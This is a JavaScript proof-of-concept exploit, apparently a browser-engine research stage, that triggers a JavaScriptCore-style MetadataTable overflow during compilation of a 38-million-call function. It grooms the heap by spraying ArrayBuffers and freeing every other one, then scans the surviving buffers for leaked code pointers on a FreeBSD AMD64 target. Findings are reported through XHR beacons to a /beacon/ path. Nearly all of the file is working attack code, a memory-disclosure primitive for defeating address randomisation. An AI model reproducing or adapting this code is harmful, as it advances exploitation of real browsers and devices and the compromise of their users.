// p150h — MetadataTable overflow: Swiss cheese leak (NO EXECUTION)
//
// Key insight: finishCreation() writes valid CallLinkInfo (including
// m_slowPathCallDestination code pointers) to ALL 38M entries during
// COMPILATION. We don't need to execute the function at all.
//
// Strategy:
// 1. Spray 200 x 100KB ABs → fills marge bitfit pages
// 2. Free EVEN-indexed ABs → create interleaved holes
// 3. Compile function → metadata fills a hole
// 4. finishCreation() sweep writes FORWARD through odd-indexed ABs
// 5. Scan odd-indexed ABs for non-zero data = leaked code pointers
//
// Beacon prefix: V150H-
(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150H-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // Phase 1: Spray 200 x 100KB zeroed ABs
  var TOTAL = 200;
  var BUF_SIZE = 100096;
  var sprays = new Array(TOTAL);
  var views = new Array(TOTAL);
  for (var i = 0; i < TOTAL; i++) {
    sprays[i] = new ArrayBuffer(BUF_SIZE);
    views[i] = new Uint32Array(sprays[i]);
  }
  BS('SPRAY-' + TOTAL);

  // Phase 2: Free EVEN-indexed ABs to create interleaved holes
  // Keep ODD-indexed ABs as read targets
  var freed = 0;
  for (var i = 0; i < TOTAL; i += 2) {
    sprays[i] = null;
    views[i] = null;
    freed++;
  }
  BS('FREED-' + freed);

  // Force GC to reclaim freed backing stores
  var pressure;
  for (var round = 0; round < 3; round++) {
    pressure = [];
    for (var g = 0; g < 30; g++) pressure.push(new ArrayBuffer(512 * 1024));
    pressure = null;
  }
  for (var g = 0; g < 50000; g++) { var tmp = {x: g}; }
  BS('GC-DONE');

  // Verify remaining ABs are still zeroed
  var preNZ = 0;
  for (var i = 1; i < TOTAL; i += 2) {
    if (!views[i]) continue;
    for (var j = 0; j < 50; j++) {
      if (views[i][j] !== 0) preNZ++;
    }
  }
  BS('PRE-NZ-' + preNZ);

  // Phase 3: Compile the 38M-call function (but DON'T execute it!)
  var N = 38348816;
  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__bigFn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__bigOk=1;';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  BS('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { BS('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    BS('COMPILED-' + (window.__bigOk ? 'OK' : 'FAIL'));
    if (!window.__bigOk) return;

    // Phase 4: IMMEDIATELY scan remaining ABs for finishCreation() data
    // DO NOT call __bigFn — we only want data from compilation, not execution
    BS('SCAN-START');
    var hitBufs = 0;
    var totalNZ = 0;
    var reported = 0;

    for (var i = 1; i < TOTAL; i += 2) {
      if (!views[i]) continue;
      var v = views[i];
      var nz = 0;
      for (var j = 0; j < v.length; j++) {
        if (v[j] !== 0) nz++;
      }
      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        if (reported < 30) {
          var count = 0;
          for (var k = 0; k < v.length && count < 4; k++) {
            if (v[k] !== 0) {
              BS('L-b' + i + '-o' + (k * 4) + '-' + v[k].toString(16));
              count++;
              reported++;
            }
          }
        }
      }
    }
    BS('SCAN-hits' + hitBufs + '-nz' + totalNZ);

    // Phase 5: Deep pointer scan on hit buffers
    if (hitBufs > 0) {
      var ptrCount = 0;
      for (var i = 1; i < TOTAL && ptrCount < 10; i += 2) {
        if (!views[i]) continue;
        var u8 = new Uint8Array(sprays[i]);
        var foundInBuf = false;
        for (var j = 0; j < u8.length - 7 && ptrCount < 10; j += 8) {
          var hi = u8[j+7] << 8 | u8[j+6];
          var mid = u8[j+5] << 8 | u8[j+4];
          // FreeBSD AMD64 user space: 0x0000xxxxxxxxxxxx
          // Code pointers typically in 0x000000xx_xxxxxxxx range
          if (hi === 0 && mid !== 0) {
            var hex = '';
            for (var x = 7; x >= 0; x--) hex += ('0' + u8[j+x].toString(16)).slice(-2);
            BS('PTR-b' + i + '-o' + j + '-' + hex);
            ptrCount++;
            foundInBuf = true;
          }
        }
        if (foundInBuf && !views[i]) continue;
      }
      BS('PTRS-' + ptrCount);
    }

    // Phase 6: Dump raw bytes around metadata-entry stride (112 bytes)
    // in the first hit buffer for pattern analysis
    if (hitBufs > 0) {
      for (var i = 1; i < TOTAL; i += 2) {
        if (!views[i]) continue;
        var v = views[i];
        var anyNZ = false;
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0) { anyNZ = true; break; }
        }
        if (!anyNZ) continue;

        // Dump first 112 bytes (one metadata entry) starting from first NZ
        var startDw = 0;
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0) { startDw = j; break; }
        }
        // Align to 112-byte boundary
        var startByte = startDw * 4;
        var entryStart = Math.floor(startByte / 112) * 112;
        var entryDw = Math.floor(entryStart / 4);

        var dump = '';
        for (var d = 0; d < 28 && (entryDw + d) < v.length; d++) {
          if (d > 0) dump += ',';
          dump += v[entryDw + d].toString(16);
        }
        BS('DUMP-b' + i + '-o' + entryStart + '-' + dump);
        break;
      }
    }

    BS('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;
})();
